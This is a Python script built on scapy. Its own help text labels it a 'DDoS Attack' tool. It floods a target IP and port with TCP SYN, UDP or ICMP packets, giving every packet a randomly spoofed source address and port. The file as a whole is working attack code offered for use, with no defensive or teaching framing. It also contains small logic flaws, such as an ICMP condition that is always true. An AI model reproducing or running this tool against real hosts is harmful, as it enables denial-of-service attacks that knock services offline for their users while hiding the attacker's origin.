# Fake IP and Fake port
# TCP - UDP - ICMP

from logging import exception
from scapy.all import *
import argparse
import random 
import sys 
import threading

def RandomIP():
    return "%i.%i.%i.%i"%(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))


def RandomPort():
    return "%i"%(random.randint(1,254))


def TCPPacket(targetIP,flag,target_port):
    sourceIP = RandomIP()
    sourceport = RandomPort()
    ıp_packet = IP(src = sourceIP, dst = targetIP)
    tcp_packet = TCP(sport=int(sourceport) , dport=int(target_port) , flags=str(flag))
    send(ıp_packet/tcp_packet, verbose=False)
    print("[*]TCP packet sent successfully")


def UDPPacket(targetIP,target_port):
    sourceIP = RandomIP()
    sourceport = RandomPort()
    ıp_packet = IP(src = sourceIP, dst = targetIP)
    udp_packet = UDP(sport=int(sourceport),dport = int(target_port))
    send(ıp_packet/udp_packet,verbose=False)
    print("[*]UDP packet sent successfully")
        

def ICMPPacket(targetIP):
    sourceIP = RandomIP()
    sourceport = RandomPort()
    ıp_packet=IP(src=sourceIP,dst=targetIP)
    ıcmp_packet = ICMP()
    send(ıp_packet/ıcmp_packet, verbose=False)
    print("[*]ICMP packet sent successfully")

if __name__=="__main__":

    parser = argparse.ArgumentParser(description='DDoS Attack')
    parser.add_argument('-t', '--target', help='Target IP adress',dest='target_ip',default=False)
    parser.add_argument('-p', '--port', help='Target Port adress',dest='target_port',default=False)
    parser.add_argument('--packet', help='Packet type',dest='packet',default=False)
    parser.add_argument('-f', '--flag', help='TCP packet Flags',dest='flag',default=False)
    parser.add_argument('-c', '--count', help='Number of packet to sent', dest='count',)
    args = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    elif ((not args.target_ip) or (not args.target_port)):
        print("invalid target or port")
        sys.exit(1)
    

    target_ip = args.target_ip
    target_port = args.target_port
    if args.packet :
        packet = str(args.packet)
    elif not args.packet:
        packet = 'udp'
    try:

        try:
            if packet.lower() == 'tcp':
            
                if args.flag:
                    flag = str(args.flag)
                    flag.upper()
                elif not args.flag:
                    flag = 'S'
                    print("[*]TCP Packet flag ==> SYN")
                for i in range(int(args.count)):
                    TCPPacket(target_ip,flag,target_port)
        
            elif packet.lower() == 'udp':
                for i in range(int(args.count)):
                    UDPPacket(target_ip,target_port)
        
            elif packet.lower() == 'icmp' or 'ıcmp':
                for i in range(int(args.count)):    
                    ICMPPacket(target_ip)
            else :
                print("[!]Packet type is Wrong. \n[!]Please use udp,tcp or icmp")
                sys.exit(1)
        except :
            print ("[!]Someting went wrong")
            sys.exit(1)

    except KeyboardInterrupt:
        print("[!]User Cancelled Attack ")
        sys.exit(1)
